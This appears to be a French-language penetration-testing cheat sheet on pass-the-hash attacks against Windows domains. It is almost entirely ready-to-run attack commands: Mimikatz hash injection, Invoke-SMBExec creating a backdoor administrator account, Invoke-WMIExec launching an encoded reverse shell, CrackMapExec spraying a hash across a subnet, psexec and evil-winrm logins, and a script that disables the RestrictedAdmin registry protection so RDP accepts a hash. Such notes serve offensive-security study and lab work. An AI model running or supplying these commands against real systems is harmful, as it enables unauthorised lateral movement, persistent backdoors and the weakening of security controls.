---
public: true # set to true to make the article publishable
---
## Localement
### Mimikatz

On peut créer un processus disposant des identifiants réseau d'un autre utilisateur pour accéder à des ressources réseau en son nom
```
# lancer un processus en tant qu'un autre utilisateur (julio) dont on connait le hash
    # on peut remplacer /rc4 par /NTLM
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:domain.local /run:cmd.exe" exit


```

### Invoke-TheHAsh

On peut également exécuter des commandes à distance en tant qu'un utilisateur dont on possède le Hash (s'il possède les droits requis bien évidemment)
```powershell

# Powershell avec Invoke-TheHash (https://github.com/Kevin-Robertson/Invoke-TheHash)
Import-Module .\Invoke-TheHash.psd1

# exécution de command (backdoor user)
Invoke-SMBExec -Target 172.16.1.10 -Domain domain.local -Username ad_user -Hash AAAAAAAAAA88057E06A81B54E73B949B -Command "net user rebrec Password123 /add && net localgroup administrators rebrec /add" -Verbose

# lancement d'un reverse shell
Invoke-WMIExec -Target DC01 -Domain domain.local -Username ad_user -Hash AAAAAAAAAA88057E06A81B54E73B949B -Command "powershell -e <base64_reverseshell_payload>"
```

## A Distance

### Crackmapexec
```
# Tester les machines d'un sous réseau 
cme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
cme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth

# Exécuter une commande sur les machines
cme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

```

### Impacket

```
psexec.py Administrator@$TARGET_IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453  
```

### Evil-WinRM
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### Via RDP
Il est nécessaire de désactiver une restriction empêchant de se connecter en RDP en administrateur via du PtH. Pour ce faire :

```
# Localement
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# A Distance
cme smb $TARGET_IP -u Administrator -H '30B3783CE2ABF1AF70F77D0660CF3453' --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' 
```

On peut ensuite utiliser **xfreerdp**

```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

**Attention**
Seul le compte Administrateur local (RID-500) peut utiliser PtH sur les environnements où l'UAC est actif.
Le paramètre `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`est à `1`, alors tous les compte locaux membre du groupe `Administrateur Local` pourront le faire également (car ils disposeront d'un jeton "Full Integrity")
** Les comptes utilisateurs du domaine qui sont membres du groupe `Administrateur Local` ne sont dans tous les cas, pas bloqués et peuvent utiliser une attaque de type PtH**

#### Script complet (si execution à distance autorisée)

```bash
################## Non testé pour l'instant
export HASH='30B3783CE2ABF1AF70F77D0660CF3453'
export USER='Administrator'

echo "Check status of RestrictedAdmin setting"
cme smb $TARGET_IP -u $USER -H $HASH --local-auth -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' 

echo "Disabling"
cme smb $TARGET_IP -u $USER -H $HASH --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' 

echo "Connecting"
xfreerdp  /v:$TARGET_IP /u:$USER /pth:$HASH
```